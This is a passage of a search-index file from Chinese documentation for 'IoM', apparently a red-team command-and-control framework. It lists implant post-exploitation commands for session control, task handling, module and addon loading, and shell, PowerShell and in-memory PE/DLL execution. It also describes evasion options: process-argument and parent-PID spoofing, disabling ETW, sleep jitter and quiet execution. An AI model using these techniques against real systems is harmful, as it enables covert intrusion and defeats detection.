<pre><code>help\n</code></pre> \u547d\u4ee4\u6267\u884c\u540e\uff0c\u4f1a\u6309\u529f\u80fd\u5206\u7c7b\uff08\u5982\u6587\u4ef6\u64cd\u4f5c\u3001\u6743\u9650\u7ba1\u7406\u3001\u6a21\u5757\u52a0\u8f7d\u7b49 \uff09\uff0c\u7ed3\u6784\u5316\u5217\u51fa\u6240\u6709\u53ef\u7528\u547d\u4ee4\uff08\u7c7b\u4f3c\u754c\u9762\u4e2d\u5c55\u793a\u7684 <code>bof</code> <code>bypass</code> <code>cancel_task</code> \u7b49\u6a21\u5757/\u547d\u4ee4\u6309\u94ae\u5bf9\u5e94\u7684\u529f\u80fd \uff09\uff0c\u5e2e\u4f60\u5feb\u901f\u5b9a\u4f4d\u6240\u9700\u64cd\u4f5c\u3002  </p>"},{"location":"IoM/guideline/post_exploitation/#\u67e5\u770b\u547d\u4ee4\u8be6\u7ec6\u5e2e\u52a9","title":"\u67e5\u770b\u547d\u4ee4\u8be6\u7ec6\u5e2e\u52a9","text":"<p>\u60f3\u4e86\u89e3\u7279\u5b9a\u547d\u4ee4\u7528\u6cd5\uff08\u53c2\u6570\u3001\u573a\u666f\u3001\u793a\u4f8b \uff09\uff0c\u8f93\u5165\uff1a <pre><code>help [\u547d\u4ee4\u540d\u79f0]\n</code></pre></p> <p></p> <p>\u6bd4\u5982\uff0c\u67e5\u770b <code>upload</code> \u547d\u4ee4\u5e2e\u52a9\uff1a <pre><code>help upload\n</code></pre> \u6267\u884c\u540e\uff0c\u4f1a\u5c55\u793a <code>upload</code> \u529f\u80fd\u63cf\u8ff0\u3001\u53c2\u6570\u8981\u6c42\uff08\u672c\u5730\u6587\u4ef6\u8def\u5f84\u3001\u76ee\u6807\u8def\u5f84 \uff09\u3001\u4f7f\u7528\u793a\u4f8b\uff08\u5982 <code>upload local_file.txt /remote/path/</code>)\u3002  </p> <p></p>"},{"location":"IoM/guideline/post_exploitation/#\u57fa\u7840\u64cd\u4f5c","title":"\u57fa\u7840\u64cd\u4f5c","text":""},{"location":"IoM/guideline/post_exploitation/#\u4f1a\u8bdd\u7ba1\u7406","title":"\u4f1a\u8bdd\u7ba1\u7406","text":"<p>\u4f1a\u8bdd\u7ba1\u7406\u662fImplant\u540e\u6e17\u900f\u64cd\u4f5c\u7684\u57fa\u7840\uff0c\u7528\u4e8e\u7ef4\u62a4\u4e0e\u76ee\u6807\u7cfb\u7edf\u7684\u8fde\u63a5\u53ca\u5207\u6362\u4f1a\u8bdd\u4e0a\u4e0b\u6587\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u67e5\u770b\u4f1a\u8bdd\u4fe1\u606f","title":"\u67e5\u770b\u4f1a\u8bdd\u4fe1\u606f","text":"<p><pre><code>info\n</code></pre> \u663e\u793a\u5f53\u524d\u4f1a\u8bdd\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u4f1a\u8bddID\u3001\u76ee\u6807\u4e3b\u673a\u4fe1\u606f\u3001\u63d2\u4ef6\u4fe1\u606f\u7b49\u6838\u5fc3\u6570\u636e\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u521d\u59cb\u5316\u4f1a\u8bdd","title":"\u521d\u59cb\u5316\u4f1a\u8bdd","text":"<p><pre><code>init\n</code></pre> \u521d\u59cb\u5316\u5f53\u524d\u4f1a\u8bdd\uff0c\u5efa\u7acb\u4e0eIoM pipeline\u7684\u7a33\u5b9a\u901a\u4fe1\u94fe\u8def\uff0c\u786e\u4fdd\u540e\u7eed\u64cd\u4f5c\u7684\u6307\u4ee4\u80fd\u6b63\u5e38\u4e0b\u53d1\u4e0e\u56de\u4f20\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u5207\u6362\u4f1a\u8bdd","title":"\u5207\u6362\u4f1a\u8bdd","text":"<p><pre><code>switch\n</code></pre> \u5728\u591a\u4e2a\u6d3b\u8dc3\u7684Implant\u4f1a\u8bdd\u95f4\u8fdb\u884c\u5207\u6362\uff0c\u5207\u6362\u540e\u6240\u6709\u64cd\u4f5c\u5c06\u4f5c\u7528\u4e8e\u9009\u4e2d\u7684\u4f1a\u8bdd\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u6062\u590d\u4f1a\u8bdd","title":"\u6062\u590d\u4f1a\u8bdd","text":"<p><pre><code>recover\n</code></pre> \u5c1d\u8bd5\u6062\u590d\u56e0\u7f51\u7edc\u6ce2\u52a8\u6216\u76ee\u6807\u7cfb\u7edf\u4e34\u65f6\u6545\u969c\u5bfc\u81f4\u65ad\u5f00\u7684\u4f1a\u8bdd\u8fde\u63a5\uff0c\u51cf\u5c11\u91cd\u65b0\u690d\u5165\u7684\u64cd\u4f5c\u6210\u672c\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u5fc3\u8df3\u4e0e\u901a\u4fe1","title":"\u5fc3\u8df3\u4e0e\u901a\u4fe1","text":"<p>Implant\u4e0eIoM pipeline\u7684\u901a\u4fe1\u673a\u5236\u8bbe\u8ba1\uff0c\u652f\u6301\u7075\u6d3b\u7684\u4efb\u52a1\u4ea4\u4e92\u4e0e\u72b6\u6001\u540c\u6b65\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u6d4b\u8bd5\u8fde\u63a5","title":"\u6d4b\u8bd5\u8fde\u63a5","text":"<p><pre><code>ping\n</code></pre> \u6d4b\u8bd5\u4e0ebind implant\u7684\u7f51\u7edc\u8fde\u63a5\u72b6\u6001\uff0c\u9a8c\u8bc1\u94fe\u8def\u7684\u53ef\u8fbe\u6027\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u8f6e\u8be2\u4efb\u52a1\u72b6\u6001","title":"\u8f6e\u8be2\u4efb\u52a1\u72b6\u6001","text":"<p><pre><code>polling [flags]\n</code></pre> \u5b9a\u671f\u68c0\u67e5\u5df2\u4e0b\u53d1\u4efb\u52a1\u7684\u6267\u884c\u8fdb\u5ea6\u4e0e\u7ed3\u679c\uff0c\u9ed8\u8ba4\u95f4\u9694\u4e3a1\u79d2\u3002</p> <p>\u9009\u9879: - <code>--interval int</code>: \u81ea\u5b9a\u4e49\u8f6e\u8be2\u95f4\u9694\uff08\u5355\u4f4d\uff1a\u79d2\uff09</p>"},{"location":"IoM/guideline/post_exploitation/#\u7b49\u5f85\u4efb\u52a1\u5b8c\u6210","title":"\u7b49\u5f85\u4efb\u52a1\u5b8c\u6210","text":"<p><pre><code>wait [task_id1] [task_id2] [flags]\n</code></pre> \u963b\u585e\u7b49\u5f85\u6307\u5b9atask ID\u7684\u4efb\u52a1\u6267\u884c\u5b8c\u6210\uff0c\u9002\u7528\u4e8e\u9700\u8981\u4f9d\u8d56\u524d\u5e8f\u4efb\u52a1\u7ed3\u679c\u7684\u64cd\u4f5c\u573a\u666f\u3002</p> <p>\u9009\u9879: - <code>--interval int</code>: \u68c0\u67e5\u4efb\u52a1\u72b6\u6001\u7684\u95f4\u9694\uff08\u9ed8\u8ba41\u79d2\uff09</p>"},{"location":"IoM/guideline/post_exploitation/#\u914d\u7f6e\u7ba1\u7406","title":"\u914d\u7f6e\u7ba1\u7406","text":"<p>\u901a\u8fc7\u914d\u7f6e\u8c03\u6574Implant\u7684\u8fd0\u884c\u53c2\u6570\uff0c\u4f18\u5316\u9690\u853d\u6027\u4e0e\u7a33\u5b9a\u6027\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u4fee\u6539\u7761\u7720\u914d\u7f6e","title":"\u4fee\u6539\u7761\u7720\u914d\u7f6e","text":"<p><pre><code>sleep [interval/second] [flags]\n</code></pre> \u8c03\u6574Implant\u7684\u7761\u7720\u95f4\u9694\uff08\u5355\u4f4d\uff1a\u79d2\uff09\uff0c\u63a7\u5236\u4e0eC2\u670d\u52a1\u5668\u7684\u901a\u4fe1\u9891\u7387\uff0c\u5e73\u8861\u9690\u853d\u6027\u4e0e\u54cd\u5e94\u901f\u5ea6\u3002</p> <p>\u9009\u9879: - <code>--jitter float</code>: \u6296\u52a8\u503c\uff08\u767e\u5206\u6bd4\uff09\uff0c\u4f7f\u7761\u7720\u95f4\u9694\u968f\u673a\u5316\uff0c\u907f\u514d\u56fa\u5b9a\u5468\u671f\u7684\u6d41\u91cf\u7279\u5f81</p>"},{"location":"IoM/guideline/post_exploitation/#\u81ea\u6bc1","title":"\u81ea\u6bc1","text":"<p><pre><code>suicide\n</code></pre> \u7ec8\u6b62\u5f53\u524dImplant\u8fdb\u7a0b\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u4efb\u52a1\u7ba1\u7406","title":"\u4efb\u52a1\u7ba1\u7406","text":""},{"location":"IoM/guideline/post_exploitation/#\u4efb\u52a1\u64cd\u4f5c","title":"\u4efb\u52a1\u64cd\u4f5c","text":"<p>\u5bf9Implant\u4e0b\u53d1\u7684\u4efb\u52a1\u8fdb\u884c\u5168\u751f\u547d\u5468\u671f\u7ba1\u7406\uff0c\u5305\u62ec\u67e5\u8be2\u3001\u53d6\u6d88\u7b49\u64cd\u4f5c\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u5217\u51fa\u4efb\u52a1","title":"\u5217\u51fa\u4efb\u52a1","text":"<p><pre><code>tasks\n</code></pre> \u663e\u793a\u5f53\u524d\u4f1a\u8bdd\u4e2d\u6240\u6709\u4efb\u52a1\u7684\u5217\u8868\uff0c\u5305\u62ec\u4efb\u52a1ID\u3001\u72b6\u6001\u3001\u521b\u5efa\u65f6\u95f4\u7b49\u4fe1\u606f\u3002</p> <p>\u9009\u9879: - <code>-a, --all</code>: \u663e\u793a\u6240\u6709\u4efb\u52a1\uff08\u5305\u62ec\u5df2\u5b8c\u6210\u4efb\u52a1\uff09</p>"},{"location":"IoM/guideline/post_exploitation/#\u67e5\u8be2\u4efb\u52a1","title":"\u67e5\u8be2\u4efb\u52a1","text":"<p><pre><code>query_task [task_id]\n</code></pre> \u67e5\u8be2\u6307\u5b9a\u4efb\u52a1ID\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u4efb\u52a1\u7c7b\u578b\u3001\u53c2\u6570\u3001\u6267\u884c\u8fdb\u5ea6\u3001\u8f93\u51fa\u7ed3\u679c\u7b49\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u53d6\u6d88\u4efb\u52a1","title":"\u53d6\u6d88\u4efb\u52a1","text":"<p><pre><code>cancel_task [task_id]\n</code></pre> \u53d6\u6d88\u6b63\u5728\u6267\u884c\u7684\u6307\u5b9a\u4efb\u52a1\uff0c\u9002\u7528\u4e8e\u8bef\u64cd\u4f5c\u6216\u4efb\u52a1\u6267\u884c\u5f02\u5e38\u7684\u573a\u666f\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u83b7\u53d6\u4efb\u52a1\u8be6\u60c5","title":"\u83b7\u53d6\u4efb\u52a1\u8be6\u60c5","text":"<p><pre><code>fetch_task\n</code></pre> \u83b7\u53d6\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u4efb\u52a1\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u5b9e\u65f6\u8f93\u51fa\uff08\u5982\u6709\uff09\u3002</p> <p>\u5728gui\u4e0a\uff0c\u60a8\u9700\u8981\u53f3\u51fb\u5bf9\u5e94\u7684session\u884c\uff0c\u9009\u62e9show tasks\u6309\u94ae\uff0c\u5373\u53ef\u5728\u53f3\u4fa7\u663e\u793atasks\u5217\u8868\u3002</p> <p></p> <p></p>"},{"location":"IoM/guideline/post_exploitation/#\u6587\u4ef6\u7ba1\u7406","title":"\u6587\u4ef6\u7ba1\u7406","text":"<p>\u7ba1\u7406\u901a\u8fc7Implant\u4e0b\u8f7d\u7684\u6587\u4ef6\uff0c\u8ddf\u8e2a\u6587\u4ef6\u4f20\u8f93\u72b6\u6001\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u5217\u51fa\u4e0b\u8f7d\u6587\u4ef6","title":"\u5217\u51fa\u4e0b\u8f7d\u6587\u4ef6","text":"<p><pre><code>files\n</code></pre> \u663e\u793a\u6240\u6709\u5df2\u4e0b\u8f7d\u5230\u672c\u5730\u7684\u6587\u4ef6\u5217\u8868\uff0c\u5305\u62ec\u672c\u5730\u8def\u5f84\u3001\u8fdc\u7a0b\u8def\u5f84\u7b49\u4fe1\u606f\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u6a21\u5757\u7ba1\u7406","title":"\u6a21\u5757\u7ba1\u7406","text":""},{"location":"IoM/guideline/post_exploitation/#\u6a21\u5757\u64cd\u4f5c","title":"\u6a21\u5757\u64cd\u4f5c","text":"<p>\u901a\u8fc7\u52a0\u8f7d\u6a21\u5757\u6269\u5c55Implant\u7684\u529f\u80fd\uff0c\u6309\u9700\u542f\u7528\u7279\u5b9a\u540e\u6e17\u900f\u80fd\u529b\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u5217\u51fa\u6a21\u5757","title":"\u5217\u51fa\u6a21\u5757","text":"<p><pre><code>list_module\n</code></pre> \u663e\u793a\u5f53\u524d\u5df2\u52a0\u8f7d\u7684\u6240\u6709\u529f\u80fd\u6a21\u5757\uff0c\u5305\u62ec\u6a21\u5757\u540d\u79f0\u3001\u529f\u80fd\u63cf\u8ff0\u7b49\u4fe1\u606f\u3002 </p>"},{"location":"IoM/guideline/post_exploitation/#\u52a0\u8f7d\u6a21\u5757","title":"\u52a0\u8f7d\u6a21\u5757","text":"<p><pre><code>load_module [module_file] [flags]\n</code></pre> \u52a0\u8f7d\u65b0\u7684\u529f\u80fd\u6a21\u5757\uff0c\u6269\u5c55Implant\u7684\u64cd\u4f5c\u80fd\u529b\u3002</p> <ul> <li> <p>\u4ee5\u4e0b\u9009\u9879\u4e2d\u81f3\u5c11\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u3002</p> </li> <li> <p><code>--artifact</code>\u3001<code>--modules</code>\u3001<code>--3rd</code> \u4e09\u7c7b\u9009\u9879\u5747\u901a\u8fc7\u670d\u52a1\u7aef\u83b7\u53d6\u6a21\u5757\uff0c\u5176\u4e2d\uff1a</p> <ul> <li> <p><code>--artifact</code> \u76f4\u63a5\u4f7f\u7528\u670d\u52a1\u7aef\u5df2\u7f16\u8bd1\u597d\u7684\u4ea7\u7269\uff1b</p> </li> <li> <p><code>--modules</code> \u4e0e <code>--3rd</code> \u4f1a\u5728\u8bf7\u6c42\u65f6\u7531\u670d\u52a1\u7aef\u5373\u65f6\u7f16\u8bd1\u5e76\u4e0b\u8f7d\u5230\u5ba2\u6237\u7aef\u52a0\u8f7d\u3002</p> </li> </ul> </li> <li> <p><code>--path</code>  \u63d0\u4f9b\u4e86\u989d\u5916\u7684\u672c\u5730\u6253\u5305\u52a0\u8f7d\u65b9\u5f0f\u3002</p> </li> </ul> <p>\u9009\u9879: - <code>--path string</code>: \u6a21\u5757\u6587\u4ef6\u7684\u672c\u5730\u8def\u5f84 - <code>--artifact string</code>: \u4f7f\u7528\u670d\u52a1\u7aef\u5df2\u6709\u7684artifact module \u52a0\u8f7d - <code>--bundle string</code>: \u52a0\u8f7d\u6307\u5b9a\u540d\u79f0\u7684\u6a21\u5757\u6346\u7ed1\u5305 - <code>--modules string</code>: \u6307\u5b9a\u6a21\u5757\u5217\u8868\uff08\u5982 basic,extend\uff09 - <code>--3rd string</code>: \u52a0\u8f7d\u7b2c\u4e09\u65b9\u5f00\u53d1\u7684\u6a21\u5757</p> <p>\u793a\u4f8b: <pre><code># \u4ece\u6307\u5b9a\u8def\u5f84\u52a0\u8f7d\u6a21\u5757\nload_module --path sys.dll\n\n# \u57fa\u4e8e\u670d\u52a1\u7aef\u5df2\u7f16\u8bd1\u597d\u7684 artifact \u8fdb\u884c\u52a0\u8f7d\nload_module --artifact &lt;artifact_name&gt;\n\n# \u52a0\u8f7d\u6307\u5b9a\u6a21\u5757\nload_module --modules execute_dll,sys_full\n\n# \u52a0\u8f7d\u7b2c\u4e09\u65b9\u63d2\u4ef6(\u76ee\u524d\u652f\u6301rem\u548ccurl)\nload_modules --3rd rem\n\n# \u67e5\u770b\u52a0\u8f7d\u7684\u6a21\u5757\nlist_module\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u5237\u65b0\u6a21\u5757","title":"\u5237\u65b0\u6a21\u5757","text":"<p><pre><code>refresh_module\n</code></pre> \u5237\u65b0\u5f53\u524d\u6a21\u5757\u5217\u8868\uff0c\u540c\u6b65\u6700\u65b0\u7684\u6a21\u5757\u72b6\u6001\uff08\u5982\u6a21\u5757\u66f4\u65b0\u6216\u914d\u7f6e\u53d8\u66f4\uff09\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u6e05\u9664\u6a21\u5757","title":"\u6e05\u9664\u6a21\u5757","text":"<p><pre><code>clear\n</code></pre> \u5378\u8f7d\u6240\u6709\u5df2\u52a0\u8f7d\u7684\u6a21\u5757\uff0c\u91ca\u653e\u8d44\u6e90\u5e76\u6062\u590dImplant\u7684\u57fa\u7840\u529f\u80fd\u72b6\u6001\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u63d2\u4ef6\u7ba1\u7406","title":"\u63d2\u4ef6\u7ba1\u7406","text":"<p>\u52a0\u8f7d\u53ef\u6267\u884c\u6587\u4ef6\u4f5c\u4e3a\u63d2\u4ef6\uff0c\u5b9e\u73b0\u91cd\u590d\u8c03\u7528\u4e0e\u529f\u80fd\u6269\u5c55\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u52a0\u8f7d\u63d2\u4ef6","title":"\u52a0\u8f7d\u63d2\u4ef6","text":"<p><pre><code>load_addon [flags]\n</code></pre> \u5c06\u53ef\u6267\u884c\u6587\u4ef6\u52a0\u8f7d\u5230Implant\u5185\u5b58\u4e2d\uff0c\u4f9b\u540e\u7eed\u91cd\u590d\u8c03\u7528\uff0c\u907f\u514d\u591a\u6b21\u4f20\u8f93\u6587\u4ef6\u3002</p> <p>\u9009\u9879: - <code>-n, --name string</code>: \u63d2\u4ef6\u7684\u522b\u540d\uff08\u4fbf\u4e8e\u540e\u7eed\u8c03\u7528\uff09</p> <ul> <li><code>-m, --module string</code>: \u63d2\u4ef6\u6240\u5c5e\u7684\u6a21\u5757\u7c7b\u578b</li> </ul> <p>\u793a\u4f8b: <pre><code># \u4f7f\u7528\u9ed8\u8ba4\u540d\u79f0\u52a0\u8f7d\u63d2\u4ef6\nload_addon gogo.exe\n# \u6307\u5b9a\u522b\u540d\u548c\u6a21\u5757\u7c7b\u578b\nload_addon gogo.exe -n gogo -m execute_exe\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u5217\u51fa\u63d2\u4ef6","title":"\u5217\u51fa\u63d2\u4ef6","text":"<p><pre><code>list_addon [addon]\n</code></pre> \u663e\u793a\u6240\u6709\u5df2\u52a0\u8f7d\u7684\u63d2\u4ef6\uff0c\u5305\u62ec\u63d2\u4ef6\u540d\u79f0\u3001\u8def\u5f84\u3001\u6a21\u5757\u7c7b\u578b\u7b49\u4fe1\u606f\uff1b\u6307\u5b9a\u63d2\u4ef6\u540d\u79f0\u65f6\uff0c\u663e\u793a\u8be5\u63d2\u4ef6\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u6267\u884c\u63d2\u4ef6","title":"\u6267\u884c\u63d2\u4ef6","text":"<p><pre><code>execute_addon [flags]\n</code></pre> \u6267\u884c\u5df2\u52a0\u8f7d\u7684\u63d2\u4ef6\uff0c\u652f\u6301\u591a\u79cd\u5b89\u5168\u4e0e\u9690\u853d\u6027\u914d\u7f6e\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>-a, --argue string</code>: \u6b3a\u9a97\u8fdb\u7a0b\u53c2\u6570\uff08\u9690\u85cf\u771f\u5b9e\u64cd\u4f5c\u610f\u56fe\uff09</p> </li> <li> <p><code>-b, --block_dll</code>: \u963b\u6b62\u975e\u5fae\u8f6f\u7b7e\u540d\u7684DLL\u6ce8\u5165\u5230\u8fdb\u7a0b\u4e2d</p> </li> <li> <p><code>--etw</code>: \u7981\u7528ETW\uff08Event Tracing for Windows\uff09\u8ddf\u8e2a</p> </li> <li> <p><code>-p, --ppid uint32</code>: \u4f2a\u9020\u7236\u8fdb\u7a0bID\uff08\u63d0\u5347\u9690\u853d\u6027\uff09</p> </li> <li> <p><code>-n, --process string</code>: \u81ea\u5b9a\u4e49\u6267\u884c\u63d2\u4ef6\u7684\u8fdb\u7a0b\u8def\u5f84</p> </li> <li> <p><code>-q, --quiet</code>: \u7981\u7528\u8f93\u51fa\u4fe1\u606f\uff08\u51cf\u5c11\u64cd\u4f5c\u75d5\u8ff9\uff09</p> </li> <li> <p><code>-t, --timeout uint32</code>: \u6267\u884c\u8d85\u65f6\u65f6\u95f4\uff08\u5355\u4f4d\uff1a\u79d2\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code># \u6267\u884c\u4e0d\u5e26\u53c2\u6570\u7684\u63d2\u4ef6\nexecute_addon httpx 1.1.1.1\n# \u6267\u884c\u5e26\u53c2\u6570\u7684\u63d2\u4ef6\nexecute_addon gogo.exe -- -i 127.0.0.1 -p http\n</code></pre></p> <p>\u6267\u884c\u5e26\u53c2\u6570\u547d\u4ee4</p> <p>\u5f53\u63d2\u4ef6\u53c2\u6570\u4ee5\u77ed\u6a2a\u7ebf\uff08<code>-</code>\uff09\u5f00\u5934\u65f6\uff0c\u5fc5\u987b\u7528\u00a0<code>--</code>\u00a0\u5206\u9694\uff0c\u5426\u5219\u63a7\u5236\u53f0\u4f1a\u8bef\u5224\u53c2\u6570\u5f52\u5c5e\uff0c\u5bfc\u81f4\u63d2\u4ef6\u6267\u884c\u5931\u8d25\u6216\u529f\u80fd\u5f02\u5e38\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u6267\u884c\u547d\u4ee4","title":"\u6267\u884c\u547d\u4ee4","text":""},{"location":"IoM/guideline/post_exploitation/#\u57fa\u7840\u6267\u884c","title":"\u57fa\u7840\u6267\u884c","text":"<p>\u5728\u76ee\u6807\u7cfb\u7edf\u4e2d\u6267\u884c\u5404\u7c7b\u547d\u4ee4\uff0c\u83b7\u53d6\u8f93\u51fa\u6216\u6267\u884c\u64cd\u4f5c\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u6267\u884c\u547d\u4ee4_1","title":"\u6267\u884c\u547d\u4ee4","text":"<p><pre><code>run [cmdline]\n</code></pre> \u6267\u884c\u672c\u5730\u53ef\u6267\u884c\u6587\u4ef6\u5e76\u8fd4\u56de\u8f93\u51fa\u7ed3\u679c\uff0c\u9002\u7528\u4e8e\u9700\u8981\u83b7\u53d6\u6267\u884c\u53cd\u9988\u7684\u573a\u666f\u3002</p> <p>\u793a\u4f8b: <pre><code># \u6267\u884c\u7b80\u5355\u547d\u4ee4\nrun whoami\n# \u6267\u884c\u5e26\u53c2\u6570\u7684\u547d\u4ee4\nrun gogo.exe -- -i 127.0.0.1 -p http\n</code></pre></p> <p>\u6267\u884c\u5e26\u53c2\u6570\u547d\u4ee4</p> <p>\u5f53\u63d2\u4ef6\u53c2\u6570\u4ee5\u77ed\u6a2a\u7ebf\uff08<code>-</code>\uff09\u5f00\u5934\u65f6\uff0c\u5fc5\u987b\u7528\u00a0<code>--</code>\u00a0\u5206\u9694\uff0c\u5426\u5219\u63a7\u5236\u53f0\u4f1a\u8bef\u5224\u53c2\u6570\u5f52\u5c5e\uff0c\u5bfc\u81f4\u63d2\u4ef6\u6267\u884c\u5931\u8d25\u6216\u529f\u80fd\u5f02\u5e38\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u9759\u9ed8\u6267\u884c","title":"\u9759\u9ed8\u6267\u884c","text":"<p><pre><code>execute [cmdline]\n</code></pre> \u6267\u884c\u672c\u5730\u53ef\u6267\u884c\u6587\u4ef6\u4f46\u4e0d\u8fd4\u56de\u8f93\u51fa\uff0c\u9002\u7528\u4e8e\u65e0\u9700\u5b9e\u65f6\u53cd\u9988\u7684\u540e\u53f0\u64cd\u4f5c\u3002</p> <p>\u793a\u4f8b: <pre><code># \u6267\u884c\u7b80\u5355\u547d\u4ee4 \nexecute whoami  \n\n# \u6267\u884c\u5e26\u53c2\u6570\u7684\u547d\u4ee4\nexecute gogo.exe -- -i 127.0.0.1 -p http  \n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#shell-\u547d\u4ee4","title":"Shell \u547d\u4ee4","text":"<p><pre><code>shell [cmdline] [flags]\n</code></pre> \u6267\u884cshell\u547d\u4ee4\uff08\u7b49\u6548\u4e8e<code>cmd /c</code>\uff09\uff0c\u76f4\u63a5\u4e0e\u76ee\u6807\u7cfb\u7edf\u7684\u547d\u4ee4\u884c\u4ea4\u4e92\u3002</p> <p>\u9009\u9879: - <code>-q, --quiet</code>: \u7981\u7528\u8f93\u51fa\u4fe1\u606f</p>"},{"location":"IoM/guideline/post_exploitation/#powershell","title":"PowerShell","text":"<p><pre><code>powershell [cmdline] [flags]\n</code></pre> \u6267\u884cPowerShell\u547d\u4ee4\uff0c\u5229\u7528PowerShell\u7684\u5f3a\u5927\u529f\u80fd\u5b9e\u73b0\u7cfb\u7edf\u7ba1\u7406\u4e0e\u4fe1\u606f\u6536\u96c6\u3002</p> <p>\u9009\u9879: - <code>-q, --quiet</code>: \u7981\u7528\u8f93\u51fa\u4fe1\u606f</p>"},{"location":"IoM/guideline/post_exploitation/#\u9ad8\u7ea7\u6267\u884c","title":"\u9ad8\u7ea7\u6267\u884c","text":"<p>\u901a\u8fc7\u81ea\u5b9a\u4e49\u52a0\u8f7d\u5668\u6216\u6ce8\u5165\u6280\u672f\u6267\u884c\u6587\u4ef6\uff0c\u63d0\u5347\u9690\u853d\u6027\u4e0e\u7ed5\u8fc7\u9632\u5fa1\u673a\u5236\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u6267\u884c-pe-\u6587\u4ef6","title":"\u6267\u884c PE \u6587\u4ef6","text":"<p><pre><code>execute_exe [exe] [flags]\n</code></pre> \u4f7f\u7528\u81ea\u5b9a\u4e49Headless PE\u52a0\u8f7d\u5668\u5728\u727a\u7272\u8fdb\u7a0b\u4e2d\u52a0\u8f7dEXE\u6587\u4ef6\uff0c\u51cf\u5c11\u5bf9\u5f53\u524d\u8fdb\u7a0b\u7684\u5f71\u54cd\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--arch string</code>: \u76ee\u6807\u67b6\u6784\uff08x64,x86\uff09</p> </li> <li> <p><code>-a, --argue string</code>: \u6b3a\u9a97\u8fdb\u7a0b\u53c2\u6570</p> </li> <li> <p><code>-b, --block_dll</code>: \u963b\u6b62\u975e\u5fae\u8f6fDLL\u6ce8\u5165</p> </li> <li> <p><code>--etw</code>: \u7981\u7528ETW\u8ddf\u8e2a</p> </li> <li> <p><code>-p, --ppid uint32</code>: \u4f2a\u9020\u7236\u8fdb\u7a0bID</p> </li> <li> <p><code>-n, --process string</code>: \u81ea\u5b9a\u4e49\u8fdb\u7a0b\u8def\u5f84</p> </li> <li> <p><code>-q, --quiet</code>: \u7981\u7528\u8f93\u51fa</p> </li> <li> <p><code>-t, --timeout uint32</code>: \u8d85\u65f6\u65f6\u95f4\uff08\u79d2\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>execute_exe gogo.exe -- -i 123.123.123.123 -p top2\n</code></pre></p> <p>\u6267\u884c\u5e26\u53c2\u6570\u547d\u4ee4</p> <p>\u5f53\u63d2\u4ef6\u53c2\u6570\u4ee5\u77ed\u6a2a\u7ebf\uff08<code>-</code>\uff09\u5f00\u5934\u65f6\uff0c\u5fc5\u987b\u7528\u00a0<code>--</code>\u00a0\u5206\u9694\uff0c\u5426\u5219\u63a7\u5236\u53f0\u4f1a\u8bef\u5224\u53c2\u6570\u5f52\u5c5e\uff0c\u5bfc\u81f4\u63d2\u4ef6\u6267\u884c\u5931\u8d25\u6216\u529f\u80fd\u5f02\u5e38\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u672c\u5730-pe-\u6267\u884c","title":"\u672c\u5730 PE \u6267\u884c","text":"<p><pre><code>execute_local [local_exe] [flags]\n</code></pre> \u5728\u727a\u7272\u8fdb\u7a0b\u4e2d\u6267\u884c\u672c\u5730PE\u6587\u4ef6\uff0c\u9002\u7528\u4e8e\u76ee\u6807\u7cfb\u7edf\u4e0a\u5df2\u5b58\u5728\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>-a, --argue string</code>: \u6b3a\u9a97\u8fdb\u7a0b\u53c2\u6570</p> </li> <li> <p><code>-b, --block_dll</code>: \u963b\u6b62\u975e\u5fae\u8f6fDLL\u6ce8\u5165</p> </li> <li> <p><code>--etw</code>: \u7981\u7528ETW\u8ddf\u8e2a</p> </li> <li> <p><code>-o, --output</code>: \u7981\u7528\u8f93\u51fa</p> </li> <li> <p><code>-p, --ppid uint32</code>: \u4f2a\u9020\u7236\u8fdb\u7a0bID</p> </li> <li> <p><code>-n, --process string</code>: \u81ea\u5b9a\u4e49\u8fdb\u7a0b\u8def\u5f84</p> </li> <li> <p><code>-q, --quiet</code>: \u7981\u7528\u8f93\u51fa</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>execute_local local_exe --ppid 1234 --block_dll --etw --argue \"argue\"\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u6267\u884c-dll","title":"\u6267\u884c DLL","text":"<p><pre><code>execute_dll [dll] [flags]\n</code></pre> \u4f7f\u7528\u81ea\u5b9a\u4e49Headless 